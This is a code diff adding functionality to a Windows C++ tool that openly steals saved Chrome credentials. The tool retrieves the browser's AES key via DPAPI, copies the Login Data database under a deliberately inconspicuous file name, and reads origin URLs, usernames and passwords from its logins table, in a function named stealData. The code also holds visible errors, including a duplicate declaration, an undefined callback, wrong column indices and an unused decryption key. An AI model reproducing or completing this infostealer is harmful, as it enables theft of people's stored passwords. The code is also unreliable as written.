@@ -1,11 +1,19 @@
 #include <windows.h>
 #include <wincrypt.h>
 #include <iostream>
+#include "sqlite3.h" //Source: https://www.sqlite.org/capi3ref.html
 #include <stdio.h>
 #include <string.h>
 #include <tuple>
 #include <vector>
 #include "json.hpp" //Source: https://github.com/nlohmann/json
+
+struct ChromeData {
+	std::string originURL;
+	std::string actionURL;
+	std::string username;
+	std::string password;
+}
 
 std::tuple<std::string, std::string> getChromePaths() {
 	// Get current user (for the filepath)
@@ -170,7 +178,7 @@ BYTE* getAESKEy(std::string chromePath) {
 
 	// Get file "Local State" contents
 	std::string localStateContents = loadLocalState(chromePath);
-	printf("localStateContents: %s\n", localStateContents.c_str());
+	//printf("localStateContents: %s\n", localStateContents.c_str());
 
 	// Parse as JSON
 	auto localStateJSON = nlohmann::json::parse(localStateContents.c_str());
@@ -187,20 +195,119 @@ BYTE* getAESKEy(std::string chromePath) {
 	return decryptDPAPI(keyOut);
 }
 
+std::string copyChromeData(std::string databasePath) {
+	//Retrieve username
+	DWORD bufSize = 256 + 1;
+	char* userBuf = (char*) malloc(bufSize);
+
+	if (GetUserNameA(userBuf, &bufSize) == 0) {
+		printf("[ERROR] Could not retrieve username.");
+	}
+
+	//Make copy, use inconspicous name
+	std::string copiedPath = "C:\\Users\\";
+	std::string userName = userBuf;
+	std::string endPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\LoginDataOld.db";
+
+	copiedPath.append(userName);
+	copiedPath.append(endPath);
+
+	// FALSE to override other copies
+	if (CopyFile(
+			(LPCSTR) databasePath.c_str(),
+			(LPCSTR) copiedPath.c_str(),
+			FALSE) == 0) {
+		return "\0";
+	}
+
+	return copiedPath;
+}
+
+std::vector<ChromeData> stealData(BYTE* key, std::string databaseFilePath) {
+	// Access database
+	std::vector<ChromeData> out;
+	sqlite3* db;
+
+	int check = sqlite3_open(databaseFilePath.c_str(), &db);
+	if (check) {
+		printf("[ERROR] Could not open LoginDataOld.db\n");
+		sqlite3_close(db);
+		return out;
+	}
+
+	// Execute SQLite
+	std::string cmd = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
+	int execCheck = sqlite3_exec(db, cmd.c_str(), sqliteCallback, &out, 0);
+
+	sqlite3_stmt* statement; 
+	int execCheck = sqlite3_prepare_v2(db, cmd.c_str(), -1, &statement, NULL);
+	if (execCheck) {
+		printf("[ERROR] Could not execute SQLite command\n");
+		sqlite3_close(db);
+		return out;
+	}
+	while ((execCheck = sqlite3_step(statement)) == SQLITE_ROW) {
+        int id = sqlite3_column_int(statement, 0);
+        const char* origin_url = reinterpret_cast<const char*>(sqlite3_column_text(statement, 1));
+        const char* action_url = reinterpret_cast<const char*>(sqlite3_column_text(statement, 2));
+        const char* username = reinterpret_cast<const char*>(sqlite3_column_text(statement, 2));
+        // Just need AES on this password
+        const char* password = reinterpret_cast<const char*>(sqlite3_column_text(statement, 2));
+
+        ChromeData dataOut;
+        dataOut.originURL = std::string(origin_url);
+        dataOut.actionURL = std::string(action_url);
+        dataOut.username = std::string(username);
+        dataOut.password = std::string(password);
+
+        out.push_back(dataOut);
+    }
+    sqlite3_finalize(statement);
+
+	sqlite3_close(db);
+
+	return out;
+}
+
 int main(int argc, char* argv[]) {
 	// Access folder C:\Users\<User>\AppData\Local\Google\User Data
 	// "Local State" is the file
 
-	// Get Local State and SQLite Chrome database filepaths
+	// Get Local State and SQLite Chrome database filepaths as a tuple
 	auto [chromePath, databasePath] = getChromePaths();
-	printf("chromePath: %s\n", chromePath.c_str());
+	//printf("chromePath: %s\n", chromePath.c_str());
 
 	// Get AES key
 	BYTE* key = getAESKEy(chromePath);
 	//printf("Key: %s\n", key);
 
 	// SQLite Chrome database path
-	printf("databasePath: %s\n", databasePath.c_str());
+	//printf("databasePath: %s\n", databasePath.c_str());
+
+	// Copy ChromeData.db to hidden directory (can adjust later)
+	std::string databaseFilePath = copyChromeData(databasePath);
+	if (databaseFilePath == "\0") {
+		printf("[ERROR] Could not copy LoginDataOld.db\n");
+		return 0;
+	}
+
+	// Connect to the databse and steal data
+	std::vector<ChromeData> theGoods = stealData(key, databaseFilePath);
+	if (theGoods.empty()) {
+		return 0;
+	}
+
+	// Display results
+	printf("============\n");
+	for (int i = 0; i < theGoods.size(); i++) {
+		printf("originURL: %s\n", theGoods.at(i).originURL);
+		printf("actionURL: %s\n", theGoods.at(i).actionURL);
+		printf("username: %s\n", theGoods.at(i).username);
+		printf("password: %s\n", theGoods.at(i).password);
+		printf("============\n");
+	}
+
+	//Notes:
 
 	// getChromeContents(): get contents of JSON file "Local State"
 
